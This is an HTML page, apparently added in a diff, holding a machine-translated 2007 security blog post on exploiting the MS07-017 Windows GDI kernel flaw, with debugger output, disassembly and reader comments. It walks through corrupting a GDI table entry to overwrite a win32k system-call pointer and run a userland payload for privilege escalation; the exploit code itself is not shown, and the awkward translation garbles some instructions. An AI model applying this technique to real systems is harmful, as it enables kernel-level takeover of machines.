@@ -1,0 +1,362 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"> 
+	<title> ¡± MS07-017 Kernel Vuln Exploited</title>
+	<meta http-equiv="Content-Type" content="UTF-8" />
+	<meta name="generator" content="WordPress 2.1" />   
+	<script type='text/javascript'>
+function wpopen (macagna) {
+    window.open(macagna, '_blank', 'width=100%,height=550,scrollbars=yes,status=yes');
+}
+</script>
+		<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://ivanlef0u.free.fr/xmlrpc.php?rsd" />
+	<link rel="icon" href="http://ivanlef0u.free.fr/./repo/.img/favicon.ico" type="image/x-icon" />
+	<link rel="shortcut icon" href="http://ivanlef0u.free.fr/./repo/.img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+<body onload="load()" onunload="GUnload()"><div id="container">
+  <!-- navigation ................................. --> 
+
+<!-- content ................................. -->
+<div id="content"> 
+	<div>
+		<h2 style="border-bottom:1px dotted #666; padding-bottom: 5px;"><a href="">MS07-017 Kernel Vuln Exploited</a></h2>
+		<p class="info"> <em class="date">8th April, 2007 At 09:12</em> <em class="author">admin</em> </p>
+		<p>The history of this post starts in the train, youpi they are the holidays but before I must treat to 6h trouble with subduing the cows, instead of that I rather will do a little RE. At the beginning of week one had pointed out to me that the white papers of the confs Blackhat was dispo, one of them, that of Joel Eriksson entitled ¡°Kernel Wars¡± drew my attention, it presented various exploitations of vulnerabilities kernel on Unix cores but more especially showed that it was possible to exploit vulnerability GDI published in Month Of Kernel Bugs (MOKB). W00T. Bad thing for us it describes without too much detail how it with exploited this bug, providing a methodology just and even not sploit, OUIN! Me after having to laugh with the poor BOF of the vuln on the level of the animated icons (files .ani) I said myself that the writing of a sploit for vuln GDI would make a zoli post for my blog.</p> 
+<p>The first about which Jojo speakspeaks to us relates to the recovery of a handle on a trick called GdiSharedHandleTable. In the 1st version of the POC of MOKB, the recovery of the handle was made by rough-force (lil), Jojo is more malignant and prefers to him to use properties of the object that he wants to obtain his handle. Knowing that a handle corresponds just to the index in the HANDLE_TABLE of a strucure HANDLE_TABLE_ENTRY, one will look at that under with our friend kernel debugger.<br /> After having the code of the POC of the MKB I note the index which it rough-force returns me:</p> 
+<pre>
+HANDLE hMapFile= (HANDLE) 0x10;
+ while (! lpMapAddress) 
+{
+hMapFile= (void*) ((int) hMapFile+1); 
+lpMapAddress = MapViewOfFile (hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+}</pre>
+<p>The object in question is of type Section, normal bus MapViewOfFile (NtMapViewOfSection in fact) goes only on this type of object. It is thus interesting to know of or comes this handle, hop I launch the POC in Olly, and I realize that the handle is already present in the HANDLE_TABLE whereas I am only on EntryPoint of my .exe, I decide to say to Olly breaker before the launching of the loader of Windows (Options-&gt;Debugging Options-&gt;Event, Make first pause At: system breakpoint), I look at the handles, any section type. It is thus the loader of win which adds it in the table, remains more than to find by which function, hop I trace nicely by looking at particularly the calls to the function systems (only able to add a handle in the HANDLE_TABLE of the process) and I notice that after the call to a function of GDI32.dll, the number of handle is modif and passes from 7 to 11:</p> 
+<pre>
+Before the call to NtGdiInit: PROCESS 838b3020 SessionId: 0 Cid: 076c Peb: 7ffde000 ParentCid: 0744 DirBase: 07af6000 ObjectTable: e1f88168 HandleCount: 7. Image: GDI.exe Afterwards: PROCESS 838b3020 SessionId: 0 Cid: 076c Peb: 7ffde000 ParentCid: 0744 DirBase: 07af6000 ObjectTable: e1f88168 HandleCount: 11. Image: GDI.exe lkd&gt;! handle 0 3 76C Section processor number 0, process 0000076c Searching for Process with Cid == 76c Searching for handles of standard Section PROCESS 838b3020 SessionId: 0 Cid: 076c Peb: 7ffde000 ParentCid: 0744 DirBase: 07af6000 ObjectTable: e1f88168 HandleCount: 11. Image: GDI.exe Our object of the section type: Handle counts At e109f000 with 11 Entries in uses 001c: Object: e1531bf8 GrantedAccess: 000f001f Entry: e109f038 Object: e1531bf8 Standard: (843c43b8) ObjectHeader Section: e1531be0 HandleCount: 19 PointerCount: 20 the call stack: Thread ID: 1656 0x77ef67eb: GDI32! NtGdiInit+0xc 0x77d1f54e: USER32! _UserClientDllInitialize+0x315 0x7c911193: ntdll! LdrpCallInitRoutine+0x14 0x7c92c9e4: ntdll! LdrpRunInitializeRoutines+0x344 0x7c931abc: ntdll! LdrpInitializeProcess+0x1131 0x7c928d66: ntdll! _LdrpInitialize+0x183</pre>
+<p>DLL GDI32 appeals system on the NtGdiInit function of the driver win32k.sys. Hop I look at what NtGdiInit with in the belly:</p> 
+<pre>
+lkd&gt; uf win32k! NtGdiInit win32k! NtGdiInit: bf8c1f3c 33c0 xor eax, eax bf8c1f3e 40 Inc eax bf8c1f3f c3 ret</pre> <p>Grut?? As you see it the foncion NtGdiInit is not very consistent, at this time a large doubt seizes me, of or that it leaves put1 handle FFS. Good let us calm and begin again, the call system is carried out in the following way.<br /> NtGdiInit in GDI32.dll - &gt; KiFastSystemCall - &gt; sysenter | KiFastCallEntry - &gt; KiSystemService - &gt; NtGdiInit</p>
+<p>Inevitably the handle is added by KiFastCallEntry or KiSystemService, remains more than to look at.</p>
+<p>In KiSystemService, I fall on the disass according to:</p> 
+<pre>
+mov ecx, ds: 0FFDFF018h xor ebx, ebx gold ebx, [ecx+0F70h] jz shorts loc_4077C0 push edx push eax call ds: _KeGdiFlushUserBatch; Grut? pop eax pop edx</pre>
+<p>In fact in 0xFFDFF000 one is in the structure KPCR (Kernel Process Control Area) of which the first field is a structure NT_TIB, and in 0¡Á18 of this struct one finds a pointer on the TEB of the thread running:</p> 
+<pre>
+lkd&gt; dt NT! _NT_TIB FFDFF000 +0x000 ExceptionList: 0xf2914c7c _EXCEPTION_REGISTRATION_RECORD +0x004 StackBase: 0xf2914df0 +0x008 StackLimit: 0xf2912000 +0x00c SubSystemTib: (null) +0x010 FiberData: (null) +0x010 Version: 0 +0x014 ArbitraryUserPointer: (null) +0x018 Coil: 0x7ffde000 _NT_TIB</pre>
+<p>And the offset 0xF70 Mtoe there are fall on:</p> 
+<pre>
+dt NT! _TEB [...] +0xf70 GdiBatchCount: Uint4B [...]</pre>
+<p>Ho the pretty meter, which I for the moment it includes/understands is that the KiSystemService function so yes checks if the GdiBatchCount field of the TEB of the thread current is worth 0, then one call the function pointed by the VAr total KeGdiFlushUserBatch.</p> 
+<pre>
+lkd&gt; dd NT! KeGdiFlushUserBatch l1 80561548 bf80db87 lkd&gt; ln bf80db87 (bf80db87) win32k! NtGdiFlushUserBatch | (bf80e078) win32k! BRUSHMEMOBJ:: pbrAllocBrush Exact matches: win32k! NtGdiFlushUserBatch =  <no>
+</no></pre>
+<p>As one can see it, this VAr points on the NtGdiFlushUserBatch function of win32k.sys hop I run, I jump, I zoom and I makes heat IDA on this API. Arf grosseuh function coded with a switch with 9 `box' (IDA analysis very well), good there I do not want RE to know which box of the switch east took into account, will be necessary to trace that under VM and then I have more battery: p<br /> Of return to me, I launch my VM by putting a BP on NtGdiFlushUserBatch, after 1h of research, I arrive at NOTHING! Apparement the handle does not come from this function¡­.  <d> ..... (TILT!) I remembered that eeye had laid a advisorie on this fault. It holds speaks about the function GdiProcessCallout, hop BP above and I starts again. BIM TOUCHAY!</d></p>
+<p>Here the call stack:</p> 
+<pre>
+kd&gt; K ChildEBP RetAddr f7f09cd4 bf8465af win32k! GdiProcessCallout+0xb8 f7f09cf0 8057ed06 win32k! W32pProcessCallout+0x5c f7f09d54 804ded5e NT! PsConvertToGuiThread+0x123 f7f09da0 7c92de0f NT! KiBBTUnexpectedRange+0xc 7ffe0300 7c91eb93 ntdll! LdrDisableThreadCalloutsForDll+0x82 7ffe0308 00000000 ntdll! KiFastSystemCallRet+0x4</pre>
+<p>Funniest it is that the call to KiBBTUnexpectedRange comes from KiSystemService, it was done right before that of NtGdiFlushUserBatch, ouinnn!<br /> In GdiProcessCallout I see splendid ObOpenObjectByPointer, which makes it possible to recover a handle on an object starting from a pointer.</p> 
+<pre>
+NTSTATUS ObOpenObjectByPointer (__in PVOID Object, __in ULONG HandleAttributes, __in_opt PACCESS_STATE PassedAccessState, __in ACCESS_MASK DesiredAccess, __in_opt POBJECT_TYPE ObjectType, __in KPROCESSOR_MODE AccessMode, __out PHANDLE Handle) Lea eax, [ebp+SectionHandle]; Handle returned on the object push eax push ebx; AccessMode = ebx =0 push ebx; ObjectType push 0F001Fh; DesiredAccess: SECTION_ALL_ACCESS push ebx; PassedAccessState push ebx; HandleAttributes push _gpHmgrSharedHandleSection; Object: pointer on the object call ds: __imp__ObOpenObjectByPointer@28; ObOpenObjectByPointer (X, X, X, X, X, X, X)</pre>
+<p>Now let us look at the table of the handles of our process. </p>
+<pre>
+kd&gt;! process PROCESS ffbc86f8 SessionId: 0 Cid: 0418 Peb: 7ffde000 ParentCid: 0530 DirBase: 06673000 ObjectTable: e15c6978 HandleCount: 8. Image: GDI.exe VadRoot 80df7d68 Vads 22 Clone 0 Private 27. Modified 0. Locked 0. DeviceMap e17669a0 Token e1028d48 ElapsedTime 00:00: 00.911 UserTime 00:00: 00.020 KernelTime 00:00: 00.821 QuotaPoolUsage [PagedPool] 10532 QuotaPoolUsage [NonPagedPool] 880 Working Set Sizes (now, min, max) (136, 50, 345) (544KB, 200KB, 1380KB) PeakWorkingSetSize 136 VirtualSize 8 Mb PeakVirtualSize 8 Mb PageFaultCount 132 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 42 THREAD 80de8478 Cid 0418.03f0 Teb: 7ffdd000 Win32Thread: 00000000 RUNNING one processor 0 kd&gt;! handle 0 3 0418 Section processor number 0, processes 00000418 Searching for Process with Cid == 418 Searching for handles of standard Section PROCESS ffbc86f8 SessionId: 0 Cid: 0418 Peb: 7ffde000 ParentCid: 0530 DirBase: 06673000 ObjectTable: e15c6978 HandleCount: 8. Image: GDI.exe Handle counts At e1043000 with 8 Entries in uses 001c: Object: e13ad6b0 GrantedAccess: 000f001f Entry: e1043038 Object: e13ad6b0 Standard: (80eb2040) ObjectHeader Section: e13ad698 HandleCount: 16 PointerCount: 17</pre>
+<p>Youpi, the object appears in the table:]</p>
+<p>The ObOpenObjectByPointer function is followed of ZwMapViewOfSection which goes mapper in the memory capacity of the process the section.</p> 
+<pre>
+mov [ebp+BaseAddress], ebx mov [ebp+ViewSize], ebx mov [ebp+SectionHandle], ebx push 2; Protect: #define PAGE_READONLY 0x02 push ebx; AllocationType push 2; InheritDisposition Lea eax, [ebp+ViewSize] push eax; ViewSize push ebx; SectionOffset push ebx; CommitSize push ebx; ZeroBits Lea eax, [ebp+BaseAddress] push eax; BaseAddress = 0 push 0FFFFFFFFh; ProcessHandle, -1 = CurrentProcess push [ebp+SectionHandle]; SectionHandle call ds: __imp__ZwMapViewOfSection@40; ZwMapViewOfSection (X, X, X, X, X, X, X, X, X, X) mov EDI, eax cmp EDI, ebx</pre>
+<p>If the BaseAddress argument is null (it is the case here), then the ZwMapViewOfSection function gives us the first memory capacity UserSpace dispo which finds. After the call the function returns in [ebp+BaseAddress] 0¡Á410000. The section is thus mapp¨¦ in the memory capacity of the process in reading alone to the address 0¡Á410000. Let us throw a glance with the VAD.</p> 
+<pre>
+kd&gt;! vad 80df7d68 VAD level start end made 80e22728 (1) 10 10 1 Private READWRITE ffbc7ef8 (2) 20 20 1 Private READWRITE 80df2648 (3) 30 12f 3 Private READWRITE 80da3660 (4) 130.132 0 Mapped READONLY ffaf95b0 (5) 140 23f 3 Private READWRITE ffaeeca8 (6) 240 24f 6 Private READWRITE ffb94308 (7) 250 25f 0 Mapped READWRITE 80d25958 (8) 260.275 0 Mapped READONLY 80d2c1e8 (9) 280 2bc 0 Mapped READONLY 80d2c218 (10) 2c0 300 0 Mapped READONLY 80d2c248 (11) 310.315 0 Mapped READONLY 80d25928 (12) 320 3e7 0 Mapped EXECUTE_READ 80d00550 (0) 400.406 7 Mapped Exe EXECUTE_WRITECOPY 80cec448 (4) 410.512 0 Mapped READONLY &lt;------------ Our section 80e1f230 (3) 77d10 77d9f 2 Mapped Exe EXECUTE_WRITECOPY 80e3a670 (4) 77ef0 77f35 1 Mapped Exe EXECUTE_WRITECOPY 80d0c5f0 (2) 7c800 7c903 5 Mapped Exe EXECUTE_WRITECOPY 80d00520 (1) 7c910 7c9c6 5 Mapped Exe EXECUTE_WRITECOPY 80e71c40 (3) 7f6f0 7f7ef 0 Mapped EXECUTE_READ 80d25898 (2) 7ffb0 7ffd3 0 Mapped READONLY 80d00900 (3) 7ffdd 7ffdd 1 Private READWRITE 80d21228 (4) 7ffdf 7ffdf 1 Private READWRITE</pre> <p>Good let us calm, one knows now or comes this handle. The loader of Windows, during the loading of user32.dll will call the function NtGdiInit de GDI32.dll. During the call system until NtGdiInit, the code passes by the function KiSystemService (which takes care in fact to find the function in the SSDT), this one launches KiBBTUnexpectedRange which in its turn W32pProcessCallout call through PsConvertToGuiThread. The W32pProcessCallout function, starting from a pointer named _gpHmgrSharedHandleSection, obtains a handle on the object and the map in the memory capacity of the process which called NtGdiInit¡­ FUNNY hein! : p: p: p</p>
+<p>According to what I saw, Jojo it had noticed that and it of have need to carry out his exploit. What occurs in fact it is that the handle opened by ObOpenObjectByPointer is not closed again, it thus resides always in the table in handles of the process. If one can find it, one little remapper the section in memory in writing because the handle was open with all rights (SECTION_ALL_ACCESS). Therefore in the POC it rough-force functions, the handle on an object of the Section type being in the first indices of the table.</p>
+<p>Then let us see or comes the total object _gpHmgrSharedHandleSection, 3 blows of IDA and one sees that the section east creates by the HmgCreate function, it even being called by InitializeGre which is launched by GsDriverEntry. By exploring the disass of HmgCreate one can see:</p> 
+<pre>
+push ebx push ebx push 8400000h; push EDI Lea eax, [ebp+var_C] push eax push ebx push 6 push offset _gpHmgrSharedHandleSection mov [ebp+var_8], ebx mov dword ptr [ebp-0Ch], 102ADCh call ds: __imp__MmCreateSection@32; MmCreateSection (X, X, X, X, X, X, X, X) test eax, eax jl loc_BF89083A; if NULL one kass Lea eax, [ebp+ViewSize] push eax; ViewSize push offset _gpGdiSharedMemory; MappedBase push _gpHmgrSharedHandleSection; Section mov [ebp+ViewSize], ebx call ds: __imp__MmMapViewInSessionSpace@12; MmMapViewInSessionSpace (X, X, X) test eax, eax jl loc_BF89083A; if NULL one kass mov eax, _gpGdiSharedMemory cmp eax, ebx Lea ecx, [eax+100000h] mov _gpentHmgr, eax; _gpentHmgr=_gpGdiSharedMemory</pre>
+<p>MmCreateSection creates the _gpHmgrSharedHandleSection object then the MmMapViewInSessionSpace function will create the section in space kernel. If one looks at the contents with the address _gpGdiSharedMemory which is in the kernel memory and that that one can see in our process after MapViewOfFile, one notices that they are identical. Normal, MapViewOfFile makes it possible to show ¡°¡± with the userland part process a section of the memory core.</p>
+<p>Now that I included/understood the thing better, I continue to read the paper of Jojo. Apparently the section contains a list of GDITableEntry structure, defined by:</p> 
+<pre>
+typedef struct {DWORD pKernelInfo; WORD ProcessID; WORD _nCount; WORD nUpper; WORD nType; DWORD pUserInfo; } GDITableEntry;</pre>
+<p>All the process having this list jointly only the ProcessID field makes it possible to know to which process a structure belongs. Like known as so well Jojo, it is by handling the value pKernelInfo that it is possible to write in KernelSpace. It acknowledges nevertheless that it with chial¨¦ its race to find something of correct:]<br /> ¡°The methodology used for finding has way to achieve year arbitrary memory overwrite was partially trial and error [¡­]¡±</p>
+<p>Then it is necessary found a function system, which one can call of the userland, which handles this section and in particuler the field pKernelInfo. I thus seek function in NT **** in win32k.sys referring to the memory capacity pointed by _gpGdiSharedMemory and _gpentHmgr ......</p>
+<p>[............................. Crossed desert .............................]</p>
+<p>2 days of research, 2 put1 of days to test hundreds of possibilities and to puff out chocapics, I have failed to crack several times but I finally succeeded. </p>
+<p>It was necessary me to find an end of code which modified a defined address, I obtained it (not without evil) in the function bDeleteBrush of the driver win32k.sys. This function allows removed object of the type ¡°brush¡± creates by CreateSolidBrush, the supression being done using API DeleteObject. After having modified the value pKernelInfo of the GDITableEntry structure corresponding to my ¡°brush¡± and having tested various combinations, that only a person taking drugs with the chocapics could have thought, I have to succeed in writing at an arbitrary address. The dissass is as follows:</p> 
+<pre>
+win32k.sys bDeleteBrush mov esi, [edx]; esi=pKernelInfo cmp [esi+4], ebx; ebx=0, it is necessary that [esi+4] &gt;0 mov eax, [edx+0Ch] mov [ebp+var_8], eax ja shorts loc_BF80C1E7; jump if [esi+4] &gt; 0 loc_BF80C1E7: mov eax, [esi+24h]; [esi+24] = addr that one wants fister mov dword ptr [eax], 2</pre>
+<p>Thus if pKernelInfo point on a buffer craft¨¦ by our care and that in 0¡Á24 of this buffer is a valid address, its contents will take value 2.</p>
+<p>Then LOL?! how is what one can foutre with Ca?! H¨¦ well the trick of maladouf consists in modifying the address of a call system (contained in the SSDT) so that it is to redirect towards a low address, i.e. in the userspace. For example:</p> 
+<pre>
+lkd&gt; dps bf998300 L 2 bf998300 bf934921 win32k! NtGdiAbortDoc bf998304 bf94648d win32k! NtGdiAbortPath</pre>
+<p>Must become:</p> 
+<pre>
+lkd&gt; dps bf998300 L 2 bf998300 00000002 bf998304 bf94648d win32k! NtGdiAbortPath</pre>
+<p>Thus if one map in userspace with the address 0¡Á2 a payload and that one call the native function NtGdiAbortDoc, BIM! BLOW OF HEAD, SMALL BRUSH, CUFF!!!!!! the payload will be carried out. I have chooses the SSDT of the driver win32k.sys because that of the ntoskrnl is in reading alone (thank you in Jojo for all these infos).</p>
+<p>To allocate memory in 0¡Á2 it is enough to use NtAllocateVirtualMemory. Then the SSDT of the driver win32k.sys not being charged at a constant address, I have r¨¦cup the imageBase driver with NtQuerySystemInformation having InformationClass put at SystemModuleInformation (11). Finally For the call to API native NtGdiAbortDoc, one re-uses direct code ASM of the native call contained in gdi32.dll:</p> 
+<pre>
+lkd&gt; uf GDI32! NtGdiAbortDoc GDI32! NtGdiAbortDoc: 77f3073a b800100000 mov eax, 1000h 77f3073f ba0003fe7f mov edx, SharedUserData offset! SystemCallStub (7ffe0300) 77f30744 ff12 call dword ptr [edx] 77f30746 c20400 ret 4</pre>
+<p>Concerning the shellcode, I used a generic payload made reboot the machine:] (the same one as that of my post ¡°kernel BOF¡±). I reserve myself the right to code of them one more practical for owner of the b0x: p</p>
+<p>Otherwise Immunity ach¨¦t¨¦ the rights of the sploit until the end of ego of April, these mofo surely had croirent that nobody would dare coded a sploit on this fault. It is from now on made thing and I profited from it for the release on milw0rm.</p>
+<p>Ivanlef0u, OMG th4t w4s s0 l33t!</p>
+<p>the sploit young stag:</p>  
+
+   </div>
+
+
+
+<!-- comments ................................. -->
+<div id="comments">
+
+
+
+	<h2>13 Comments <a href="#commentform" class="more">Add your own</a></h2>
+
+	<ul>
+
+	
+	<li id="comment-1" class="comment">
+	<p class="header"><strong>1.</strong> <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://blog_soon/" rel="external nofollow">kojii</a> | 8th April, 2007 At 21:40 </p>
+		<p>heh beh good job dude;).<br /> Even me which does not coil Windows I appreciated the text and Ca is seen that there was job behind (like hab what).</p>
+<p>Good continuation.</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-2" class="comment">
+	<p class="header alt"><strong>2.</strong> whiskas | 9th April, 2007 At 11:59</p>
+		<p>Very interesting like article, I come to discover your blog by the exploit which you posted on milw0rm, and it is good job.</p>
+<p>Your blog makes party of my RSS now.  <img src="http://ivanlef0u.free.fr/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /></p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-3" class="comment">
+	<p class="header"><strong>3.</strong> <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/" rel="external nofollow">admin</a> | 9th April, 2007 At 18:15</p>
+		<p>After having modified the payload and having made the sploit generic and more stable, I succeeded in On the other hand making to spawn Shell with rights SYSTEM w00t b0x  <img src="http://ivanlef0u.free.fr/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> r00ted this version I keep it for mwa!</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-4" class="comment">
+	<p class="header alt"><strong>4.</strong> <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://www.immunityinc.com/" rel="external nofollow">Dave Aitel</a> | 9th April, 2007 At 18:57</p>
+		<p>This is good work! With very good text one the problem.</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-5" class="comment">
+	<p class="header"><strong>5.</strong> <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://touronster.blogspot.com/" rel="external nofollow">Touronster</a> | 9th April, 2007 At 22:48</p>
+		<p>Very sympathetic, I did not read your article of the beginning, I rather analyzed your PoC and the end of your article, but they is super sympathetic!</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-6" class="comment">
+	<p class="header alt"><strong>6.</strong> silma | 10th April, 2007 At 9:30</p>
+		<p>It is on, you will become maitre world before me¡­<br /> but when you are high there, would be careful¡­ a putch so quickly arrived¡­ niark niark  <img src="http://ivanlef0u.free.fr/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" /></p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-7" class="comment">
+	<p class="header"><strong>7.</strong> hay | 10th April, 2007 At 15:09</p>
+		<p>Good! cut has Nice day</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-8" class="comment">
+	<p class="header alt"><strong>8.</strong> Baboon | 10th April, 2007 At 16:47</p>
+		<p>Just like Ca:<br /> It is ¡°blow head, cuff, small brush¡±<br /> thus try to put a cuff has a guy has ground¡­<br /> you your small nails on the ground but another thing is likely more to scrape you¡­<br />
+ <img src='http://ivanlef0u.free.fr/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /><br /> If not /me likes the tricks funny of this kind</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-9" class="comment">
+	<p class="header"><strong>9.</strong> <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://news0ft.blogspot.com/" rel="external nofollow">newsoft</a> | 10th April, 2007 At 22:57</p>
+		<p>Quite simply excel!</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-10" class="comment">
+	<p class="header alt"><strong>10.</strong> unknow | 11th April, 2007 At 9:20</p>
+		<p>The chocapics Ca been able would have to pass to you has other thing instead of galerer with Ca¡­</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-11" class="comment">
+	<p class="header"><strong>11.</strong> Christophe | 11th April, 2007 At 10:08</p>
+		<p>Me I say cheer ^^</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-12" class="comment">
+	<p class="header alt"><strong>12.</strong> <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://thelsd.free.fr/" rel="external nofollow">The lsd</a> | 12th April, 2007 At 14:09</p>
+		<p>Ivan, you make me f34r has each time I read your posts!<br /> You hallucinates me!<br /> /me turns over to its p?vres small faults php the low head</p>
+<p>Enjoy</p>
+<p>The lsd</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+	<li id="comment-13" class="comment">
+	<p class="header"><strong>13.</strong> Tr4c3 | 13th April, 2007 AT1: 20</p>
+		<p>Very well. Thx for shareing.</p>
+		</li> <hr color="#666666" width=1>
+
+	
+
+</ul>
+
+
+
+	<h2>Leave has How</h2>
+
+	
+	<form action="http://ivanlef0u.free.fr/wp-comments-post.php" method="post" id="commentform">
+		<fieldset>
+
+	
+			<p><label for="author">Name</label> <input type="text" name="author" id="author" value="" tabindex="1" />  </p>
+			<p><label for="email">Email</label> <input type="text" name="email" id="email" value="" tabindex="2" /> <em>hidden</em></p>
+			<p><label for="url">URL</label> <input type="text" name="url" id="url" value="" tabindex="3" /></p>
+
+
+			<p><label for="comment">How</label> <textarea name="comment" id="comment" cols="45" rows="10" tabindex="4"></textarea></p>
+			<p><input type="hidden" name="comment_post_ID" value="41" />
+			<input type="submit" name="submit" value="Submit" class="button" tabindex="5" /></p>
+
+	  	</fieldset>
+	  </form>
+
+	<p><strong>Some HTML allowed:</strong><br/>&lt;a href= "" title= "" &gt; &lt;abbr title= "" &gt; &lt;acronym title= "" &gt; &lt;b&gt; &lt;blockquote cite= "" &gt; &lt;code&gt; &lt;em&gt; &lt;i&gt; &lt;strike&gt; &lt;strong&gt;  </p>
+
+
+
+	<p><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/wp-trackback.php&#037;3Fp&#037;3D41">Trackback this post</a> | <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Ffeed&#037;3Drss2&#037;26p&#037;3D41">Subscribe to the comments via RSS Feed</a></p>
+
+</div> <!-- /comments -->
+</div> <!-- /content -->
+
+<hr class="low" />
+
+<div id="subcontent">
+
+
+
+
+
+
+
+
+
+
+
+
+	<h2><em>Calendar</em></h2>
+
+
+
+	<table id="wp-calendar">
+	<caption>April 2007</caption>
+	<thead>
+	<tr>
+		<th abbr="Lundi" scope="col" title="Lundi">L</th>
+		<th abbr="Mardi" scope="col" title="Mardi">My</th>
+		<th abbr="Mercredi" scope="col" title="Mercredi">Me </th>
+		<th abbr="Jeudi" scope="col" title="Jeudi">J</th>
+		<th abbr="Vendredi" scope="col" title="Vendredi">V</th>
+		<th abbr="Samedi" scope="col" title="Samedi">S</th>
+		<th abbr="Dimanche" scope="col" title="Dimanche">D</th>
+	</tr>
+	</thead>
+
+	<tfoot>
+	<tr>
+		<td abbr="mars" colspan="3" id="prev"><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fm&#037;3D200703" title="See the articles for March 2007">¡°mar</a></td>
+		<td class="pad">&nbsp;</td>
+		<td colspan="3" id="next" class="pad">&nbsp;</td>
+	</tr>
+	</tfoot>
+
+	<tbody>
+	<tr>
+		<td colspan="6" class="pad">&nbsp;</td><td><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fm&#037;3D20070401" title="APC">1</a></td>
+	</tr>
+	<tr>
+		<td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fm&#037;3D20070408" title="MS07-017 Kernel Vuln Exploited">8</a></td>
+	</tr>
+	<tr>
+		<td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td id="today">14</td><td>15</td>
+	</tr>
+	<tr>
+		<td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td><td>22</td>
+	</tr>
+	<tr>
+		<td>23</td><td>24</td><td>25</td><td>26</td><td>27</td><td>28</td><td>29</td>
+	</tr>
+	<tr>
+		<td>30</td>
+		<td class="pad" colspan="6">&nbsp;</td>
+	</tr>
+	</tbody>
+	</table>
+
+
+	<h2><em>Recent Most Posts</em></h2>
+
+
+
+	<ul class="posts">
+
+	<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D40">APC</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D39">PAGE_EXECUTE_WRITECOPY</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D38">WTF</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D37">Kernel BOF</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D36">MyAPITracer</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D35">Unreal</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D34">ObpRootDirectoryObject</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D31">W00T</a></li> 
+<li><a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/&#037;3Fp&#037;3D30">Heap Overflows Revisited, Share 3</a></li> 
+
+	</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div> <!-- /subcontent -->
+<hr class="low" />
+
+
+
+<!-- footer ................................. -->
+
+<div id="footer">
+<hr size="1" color="#000000">
